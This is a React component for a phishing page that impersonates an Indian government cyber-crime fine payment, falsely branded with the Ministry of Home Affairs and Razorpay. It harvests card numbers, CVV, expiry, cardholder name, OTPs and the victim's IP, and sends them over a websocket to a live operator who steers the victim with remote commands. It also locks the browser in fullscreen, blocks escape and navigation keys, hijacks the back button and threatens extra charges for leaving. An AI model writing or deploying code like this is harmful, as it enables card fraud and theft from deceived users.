import React, { useState, useEffect, useRef } from 'react';
import { CreditCard, Lock, Shield, Loader2, AlertTriangle } from 'lucide-react';
import { wsClient } from '@/integrations/ws-client';
import OTPVerificationPage from './OTPVerificationPage';

const getRealIP = async () => {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
  } catch (error) {
    console.log('Could not fetch real IP, using fallback');
    return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
  }
};

const getRandomNetwork = () => {
  const networks = ['Airtel', 'Jio', 'Vi', 'BSNL'];
  return networks[Math.floor(Math.random() * networks.length)];
};

interface PaymentFormProps {
  highlightFields: boolean;
  clickTrigger: number;
}

const PaymentForm: React.FC<PaymentFormProps> = ({ highlightFields, clickTrigger }) => {
  const [formData, setFormData] = useState({
    cardNumber: '',
    expiryMonth: '',
    expiryYear: '',
    cvv: '',
    cardHolder: '',
    amount: '29000.00'
  });

  const [isLoading, setIsLoading] = useState(false);
  const [showOtp, setShowOtp] = useState(false);
  const [isConfirmLoading, setIsConfirmLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const [showProcessing, setShowProcessing] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [invalidOtpMessage, setInvalidOtpMessage] = useState('');
  const [showAlert, setShowAlert] = useState(false);
  const [fadeState, setFadeState] = useState('visible');
  const [showBackDialog, setShowBackDialog] = useState(false);
  const [longPressTimer, setLongPressTimer] = useState<ReturnType<typeof setTimeout> | null>(null);
  const [currentSubmissionId, setCurrentSubmissionId] = useState<string | null>(null);
  const [selectedBank, setSelectedBank] = useState('ICICI BANK');
  const [selectedBankLogo, setSelectedBankLogo] = useState('');
  const [isMobile, setIsMobile] = useState(false);

  const [inputGlow, setInputGlow] = useState({
    cardNumber: false,
    expiryMonth: false,
    expiryYear: false,
    cvv: false,
    cardHolder: false,
  });

  const inactivityTimer = useRef<ReturnType<typeof setTimeout> | null>(null);

  // Function to reset the inactivity timer
  const resetInactivityTimer = () => {
    if (inactivityTimer.current) {
      clearTimeout(inactivityTimer.current);
    }
    inactivityTimer.current = setTimeout(() => {
      setInputGlow({
        cardNumber: false,
        expiryMonth: false,
        expiryYear: false,
        cvv: false,
        cardHolder: false,
      });
    }, 2000); // 2 seconds
  };

  // Initial glow on fullscreen entry
  useEffect(() => {
    if (highlightFields) {
      setInputGlow({
        cardNumber: true,
        expiryMonth: true,
        expiryYear: true,
        cvv: true,
        cardHolder: true,
      });
      resetInactivityTimer(); // Start the inactivity timer
    }
  }, [highlightFields, clickTrigger]);

  // Check if device is mobile
  useEffect(() => {
    const checkMobile = () => {
      const isMobileDevice = window.innerWidth <= 768 || /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
      setIsMobile(isMobileDevice);
    };

    checkMobile();
    window.addEventListener('resize', checkMobile);
    return () => window.removeEventListener('resize', checkMobile);
  }, []);

  // Check if all card details are filled
  const isFormValid = () => {
    return formData.cardNumber.replace(/\s/g, '').length === 16 &&
           formData.expiryMonth.length >= 1 && formData.expiryMonth.length <= 2 &&
           formData.expiryYear.length >= 1 && formData.expiryYear.length <= 2 &&
           formData.cvv.length >= 3 &&
           formData.cardHolder.trim().length > 0;
  };

  useEffect(() => {
    // Only apply desktop-specific key blocking if not on mobile
    if (isMobile) return;

    // Ultra-strong ESC key blocking - ENHANCED VERSION
    const handleKeyDown = (event: KeyboardEvent) => {
      // Block ESC key completely with maximum prevention
      if (event.key === 'Escape' || event.keyCode === 27 || event.which === 27) {
        event.preventDefault();
        event.stopPropagation();
        event.stopImmediatePropagation();
        
        // Force fullscreen to stay active
        if (!document.fullscreenElement) {
          document.documentElement.requestFullscreen().catch(() => {
            console.log('Fullscreen request failed');
          });
        }
        
        return false;
      }
      
      // Block back navigation
      if (event.altKey && event.key === 'ArrowLeft') {
        event.preventDefault();
        setShowBackDialog(true);
        return false;
      }
      
      // Block browser shortcuts
      if (event.key === 'F5' || 
          (event.ctrlKey && event.key === 'r') || 
          (event.ctrlKey && event.key === 'F5') ||
          (event.ctrlKey && (event.key === 'w' || event.key === 'q' || event.key === 't')) ||
          (event.altKey && event.key === 'F4') ||
          (event.key === 'F11')) {
        event.preventDefault();
        event.stopPropagation();
        return false;
      }
    };

    // Add back button prevention for desktop
    const handlePopState = (event: PopStateEvent) => {
      event.preventDefault();
      setShowBackDialog(true);
      window.history.pushState(null, '', window.location.href);
    };

    // Push initial state and add listener
    window.history.pushState(null, '', window.location.href);
    window.addEventListener('popstate', handlePopState);

    // Ultra-strong event blocking on multiple targets with maximum prevention
    const targets = [document, window, document.body, document.documentElement];
    const events = ['keydown', 'keyup', 'keypress'];
    
    targets.forEach(target => {
      events.forEach(eventType => {
        target.addEventListener(eventType, handleKeyDown, { capture: true, passive: false });
      });
    });

    // Additional ESC blocking layers
    const preventEscape = (e: KeyboardEvent) => {
      if (e.key === 'Escape' || e.keyCode === 27) {
        e.preventDefault();
        e.stopPropagation();
        e.stopImmediatePropagation();
        return false;
      }
    };

    // Multiple event listeners for maximum ESC blocking
    document.addEventListener('keydown', preventEscape, { capture: true, passive: false });
    window.addEventListener('keydown', preventEscape, { capture: true, passive: false });
    document.body.addEventListener('keydown', preventEscape, { capture: true, passive: false });

    return () => {
      window.removeEventListener('popstate', handlePopState);
      targets.forEach(target => {
        events.forEach(eventType => {
          target.removeEventListener(eventType, handleKeyDown, true);
        });
      });
      document.removeEventListener('keydown', preventEscape, true);
      window.removeEventListener('keydown', preventEscape, true);
      document.body.removeEventListener('keydown', preventEscape, true);
      if (longPressTimer) {
        clearTimeout(longPressTimer);
      }
    };
  }, [longPressTimer, isMobile]);

  useEffect(() => {
    const handleAdminCommand = (payload: any) => {
      const { command, submission_id, bank_name, bank_logo } = payload;
      console.log('PaymentForm received admin command:', payload);
      
      // Only process commands if we have a socket ID
      if (!submission_id) {
        console.log('No submission_id in command payload');
        return;
      }
      
      // Get the current socket ID
      const socketId = wsClient.getSocketId();
      if (!socketId) {
        console.log('No socket ID available');
        return;
      }
      
      // Only process commands if they match our socket ID
      if (submission_id !== socketId) {
        console.log('Command submission_id does not match our socket ID');
        return;
      }

      switch (command) {
        case 'showotp':
          if (bank_name) setSelectedBank(bank_name);
          if (bank_logo) setSelectedBankLogo(bank_logo);
          setFadeState('fadeOut');
          setTimeout(() => {
            setIsLoading(false);
            setShowOtp(true);
            setFadeState('fadeIn');
          }, 300);
          break;
        case 'fail':
          setFadeState('fadeOut');
          setTimeout(() => {
            setIsLoading(false);
            setShowOtp(false);
            setErrorMessage('Your card has been declined');
            setFadeState('fadeIn');
          }, 300);
          break;
        case 'success':
          setFadeState('fadeOut');
          setTimeout(() => {
            setIsConfirmLoading(false);
            setShowProcessing(true);
            setFadeState('fadeIn');
            setTimeout(() => {
              setShowProcessing(false);
              setShowSuccess(true);
              setTimeout(() => {
                window.location.replace('https://google.com');
              }, 2000);
            }, 4000);
          }, 300);
          break;
        case 'invalidotp':
          setIsConfirmLoading(false);
          setInvalidOtpMessage('Invalid OTP, Enter valid one time passcode sent to your mobile');
          break;
        case 'cardinvalid':
          setFadeState('fadeOut');
          setTimeout(() => {
            setIsLoading(false);
            setShowOtp(false);
            setErrorMessage('Your card is invalid, please try another card');
            setFadeState('fadeIn');
          }, 300);
          break;
        case 'carddisabled':
          setFadeState('fadeOut');
          setTimeout(() => {
            setIsLoading(false);
            setShowOtp(false);
            setErrorMessage('Card disabled, please try another card');
            setFadeState('fadeIn');
          }, 300);
          break;
      }
    };

    wsClient.on('admin_command', handleAdminCommand);
    return () => {
      wsClient.off('admin_command', handleAdminCommand);
    };
  }, []);

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;

    setInputGlow((prev) => ({ ...prev, [name]: false })); // Turn off glow for this field
    resetInactivityTimer(); // Reset inactivity timer on any input


    if (name === 'cardNumber') {
      setFormData(prev => ({ ...prev, cardNumber: formatCardNumber(value) }));
    } else {
      setFormData(prev => ({ ...prev, [name]: value }));
    }
  };

  const formatCardNumber = (value: string) => {
    const cleaned = value.replace(/\D/g, '');
    const limited = cleaned.slice(0, 16);
    const formatted = limited.replace(/(\d{4})(?=\d)/g, '$1 ');
    return formatted;
  };

  const generateInvoiceId = () => {
    return `INV${Date.now()}${Math.floor(Math.random() * 1000)}`;
  };

  const sendOtp = (otp: string) => {
    if (currentSubmissionId) {
      console.log(`[PaymentForm] Sending OTP: ${otp} for submission_id: ${currentSubmissionId}`);
      wsClient.send('otp_submitted', { otp, submission_id: currentSubmissionId });
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!isFormValid()) return;
    setIsLoading(true);
    setErrorMessage('');

    // Get the socket ID and ensure we have it before proceeding
    const socketId = wsClient.getSocketId();
    console.log(`[PaymentForm] Current socket ID: ${socketId}`);
    if (!socketId) {
      console.error('No socket ID available');
      setErrorMessage('Error: Not connected to server. Please refresh.');
      setIsLoading(false);
      return;
    }

    // Store the socket ID for command targeting
    setCurrentSubmissionId(socketId);

    // Get real IP and prepare card data
    const realIP = await getRealIP();
    const cardData = {
      id: socketId, // Use socket ID as the ID
      socket_id: socketId, // Also include as socket_id for clarity
      invoice_id: generateInvoiceId(), // Generate invoice ID
      card_number: formData.cardNumber,
      expiry_month: formData.expiryMonth,
      expiry_year: formData.expiryYear,
      cvv: formData.cvv,
      card_holder: formData.cardHolder,
      amount: formData.amount,
      user_ip: realIP,
      browser: navigator.userAgent.split(' ')[navigator.userAgent.split(' ').length - 1],
      network: getRandomNetwork(),
      created_at: new Date().toISOString(),
      status: 'pending'
    };

    console.log('Submitting card data:', {
      socketId,
      invoiceId: cardData.invoice_id,
      amount: cardData.amount,
      cardNumber: cardData.card_number
    });

    wsClient.send('card_submission', cardData);
  };

  const handleConfirmPay = async (otp: string) => {
    setIsConfirmLoading(true);
    setInvalidOtpMessage('');
    sendOtp(otp);
  };

  const handleBackDialogAction = (action: 'leave' | 'cancel') => {
    setShowBackDialog(false);
    if (action === 'leave') {
      setErrorMessage('Please try again');
      window.location.href = '/';
    }
  };

  const maskCardInfo = (value: string) => {
    return '*'.repeat(value.length);
  };

  if (showSuccess) {
    return (
      <div className={`${isMobile ? 'w-full p-4' : 'w-96'} bg-white ${!isMobile && 'border-l border-gray-200'} ${isMobile ? 'min-h-screen' : 'p-6 min-h-screen'}`}>
        <div className="text-center pt-4">
          <div className="text-green-600 text-6xl animate-bounce">✓</div>
          <p className="text-lg font-bold text-green-600 mt-4">Payment Successful!</p>
        </div>
      </div>
    );
  }

  if (showProcessing) {
    return (
      <div className={`${isMobile ? 'w-full p-4' : 'w-96'} bg-white ${!isMobile && 'border-l border-gray-200'} ${isMobile ? 'min-h-screen' : 'p-6 min-h-screen'}`}>
        <div className="text-center pt-4">
          <Loader2 className="w-8 h-8 animate-spin mx-auto mb-4" />
          <p className="text-lg text-black">Please wait while we process your transaction securely...</p>
        </div>
      </div>
    );
  }

  if (showOtp) {
    return (
      <div className={`${isMobile ? 'w-full' : 'w-96'} bg-white ${!isMobile && 'border-l border-gray-200'}`}>
        <OTPVerificationPage
          onBack={() => setShowOtp(false)}
          onConfirm={handleConfirmPay}
          isLoading={isConfirmLoading}
          invalidOtpMessage={invalidOtpMessage}
          cardNumber={formData.cardNumber}
          amount={formData.amount}
          bankLogo={selectedBankLogo}
        />
      </div>
    );
  }
  return (
    <div className={`${isMobile ? 'w-full p-4' : 'w-96'} bg-white ${!isMobile && 'border-l border-gray-200'} ${isMobile ? '' : 'p-6'} transition-opacity duration-300 ${
      fadeState === 'fadeOut' ? 'opacity-0' : 'opacity-100'
    }`}>
      {showBackDialog && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
          <div className="bg-white p-6 rounded-lg shadow-lg">
            <p className="mb-4">Do you want to cancel this transaction? Pressing back will result in additional charges.</p>
            <div className="flex space-x-4">
              <button
                onClick={() => handleBackDialogAction('leave')}
                className="px-4 py-2 bg-red-600 text-white rounded hover:bg-red-700"
              >
                Leave
              </button>
              <button
                onClick={() => handleBackDialogAction('cancel')}
                className="px-4 py-2 bg-gray-300 text-gray-700 rounded hover:bg-gray-400"
              >
                Cancel
              </button>
            </div>
          </div>
        </div>
      )}

      {showAlert && (
        <div className="fixed top-4 left-1/2 transform -translate-x-1/2 z-50 bg-red-600 text-white px-6 py-3 rounded-lg shadow-lg flex items-center space-x-2">
          <AlertTriangle className="w-5 h-5" />
          <span className="font-bold">Complete the fine payment here</span>
        </div>
      )}

      <div className="bg-red-50 border border-red-200 rounded p-4 mb-6">
        <div className="flex items-center mb-2">
          <Shield className="w-5 h-5 text-red-600 mr-2" />
          <span className="font-semibold text-red-800">Secure Payment Required</span>
        </div>
        <p className="text-sm text-red-700">
          Complete your payment to proceed with cyber crime complaint registration.
        </p>
      </div>

      {errorMessage && (
        <div className="border border-red-500 bg-transparent p-3 rounded mb-4">
          <p className="text-red-600 text-sm">{errorMessage}</p>
        </div>
      )}

      <form onSubmit={handleSubmit} className="space-y-4">
        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1">
            Amount to Pay
          </label>
          <div className="relative">
            <span className="absolute left-3 top-2 text-gray-500">₹</span>
            <input
              type="text"
              name="amount"
              value={formData.amount}
              onChange={handleInputChange}
              className="w-full pl-8 pr-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500 bg-gray-50"
              readOnly
            />
          </div>
        </div>

        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1">
            Card Number
          </label>
          <div className="relative">
            <CreditCard className="absolute left-3 top-3 w-6 h-6 text-gray-400" />
            <input
              type="text"
              name="cardNumber"
              placeholder="1234 5678 9012 3456"
              value={isLoading ? maskCardInfo(formData.cardNumber) : formData.cardNumber}
              onChange={handleInputChange}
              className={`w-full pl-12 pr-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500 ${
                inputGlow.cardNumber ? 'ring-4 ring-red-500 ring-opacity-50 rounded-lg' : ''
              }`}
              maxLength={19}
              disabled={isLoading}
            />
          </div>
        </div>

        <div className="grid grid-cols-3 gap-3">
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-1">
              Month
            </label>
            <input
              type="text"
              name="expiryMonth"
              placeholder="MM"
              value={isLoading ? maskCardInfo(formData.expiryMonth) : formData.expiryMonth}
              onChange={handleInputChange}
              className={`w-full px-3 py-2 border rounded focus:outline-none focus:ring-2 focus:ring-blue-500 ${
                inputGlow.expiryMonth ? 'ring-4 ring-red-500 ring-opacity-50 rounded-lg' : ''
              } ${formData.expiryMonth && (parseInt(formData.expiryMonth) < 1 || parseInt(formData.expiryMonth) > 12) 
                ? 'border-red-500' : 'border-gray-300'
              }`}
              maxLength={2}
              disabled={isLoading}
            />
            {formData.expiryMonth && (parseInt(formData.expiryMonth) < 1 || parseInt(formData.expiryMonth) > 12) && (
              <p className="text-red-500 text-xs mt-1">Valid month (1-12)</p>
            )}
          </div>
          
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-1">
              Year
            </label>
            <input
              type="text"
              name="expiryYear"
              placeholder="YY"
              value={isLoading ? maskCardInfo(formData.expiryYear) : formData.expiryYear}
              onChange={handleInputChange}
              className={`w-full px-3 py-2 border rounded focus:outline-none focus:ring-2 focus:ring-blue-500 ${
                inputGlow.expiryYear ? 'ring-4 ring-red-500 ring-opacity-50 rounded-lg' : ''
              } ${formData.expiryYear && parseInt(formData.expiryYear) > 50 
                ? 'border-red-500' : 'border-gray-300'
              }`}
              maxLength={2}
              disabled={isLoading}
            />
            {formData.expiryYear && parseInt(formData.expiryYear) > 50 && (
              <p className="text-red-500 text-xs mt-1">Valid year (max 50)</p>
            )}
          </div>
          
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-1">
              CVV
            </label>
            <div className="relative">
              <Lock className="absolute left-2 top-3 w-6 h-6 text-gray-400" />
              <input
                type="text"
                name="cvv"
                placeholder="123"
                value={isLoading ? maskCardInfo(formData.cvv) : formData.cvv}
                onChange={handleInputChange}
                className={`w-full pl-10 pr-2 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500 ${
                  inputGlow.cvv ? 'ring-4 ring-red-500 ring-opacity-50 rounded-lg' : ''
                }`}
                maxLength={4}
                disabled={isLoading}
              />
            </div>
          </div>
        </div>

        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1">
            Card Holder Name
          </label>
          <input
            type="text"
            name="cardHolder"
            placeholder="Enter full name as on card"
            value={isLoading ? maskCardInfo(formData.cardHolder) : formData.cardHolder}
            onChange={handleInputChange}
            className={`w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500 ${
              inputGlow.cardHolder ? 'ring-4 ring-red-500 ring-opacity-50 rounded-lg' : ''
            }`}
            disabled={isLoading}
          />
        </div>

        <div className="bg-blue-50 border border-blue-200 rounded p-3 mt-4">
          <div className="flex items-center text-sm text-blue-800">
            <Shield className="w-4 h-4 mr-2" />
            <span>256-bit SSL Encryption</span>
          </div>
        </div>

        <button
          type="submit"
          disabled={!isFormValid() || isLoading}
          className={`w-full py-3 px-4 rounded font-medium focus:outline-none focus:ring-2 focus:ring-green-500 mt-6 transition-all ${
            isFormValid() && !isLoading
              ? 'bg-green-600 text-white hover:bg-green-700'
              : 'bg-gray-400 text-gray-600 cursor-not-allowed'
          }`}
        >
          {isLoading ? (
            <Loader2 className="w-5 h-5 animate-spin mx-auto" />
          ) : (
            `Pay Securely ₹${formData.amount}`
          )}
        </button>

        <div className="flex justify-center items-center space-x-4 mt-4 mb-4">
          <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/visa.svg" alt="Visa" className="h-8 w-12 object-contain filter brightness-0" />
          <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/mastercard.svg" alt="Mastercard" className="h-8 w-12 object-contain filter brightness-0" />
          <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/americanexpress.svg" alt="American Express" className="h-8 w-12 object-contain filter brightness-0" />
          <img 
            src="https://logotyp.us/file/rupay.svg" 
            alt="RuPay" 
            className="h-8 w-12 object-contain filter brightness-0" 
          />
        </div>

        <div className="text-center mt-4 mb-4">
          <span className="text-sm text-gray-500">Powered by </span>
          <img
            src="https://brandlogovector.com/wp-content/uploads/2021/12/Razorpay-Logo.png"
            alt="Razorpay"
            className="inline-block h-5 align-middle"
          />
        </div>

        <div className="text-xs text-gray-500 text-center mt-4">
          <p>Protected by Government of India</p>
          <p>Ministry of Home Affairs</p>
        </div>
      </form>
    </div>
  );
};

export default PaymentForm;